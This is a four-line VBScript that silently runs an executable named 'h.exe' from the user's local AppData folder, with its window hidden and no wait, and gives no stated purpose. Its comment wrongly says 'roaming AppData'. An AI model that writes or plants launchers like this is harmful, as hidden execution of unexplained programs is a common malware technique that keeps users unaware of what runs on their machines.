Set objShell = CreateObject("WScript.Shell")

' Path to the executable file in the roaming AppData directory
exePath = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\h.exe"

' Run the executable file
objShell.Run Chr(34) & exePath & Chr(34), 0, False
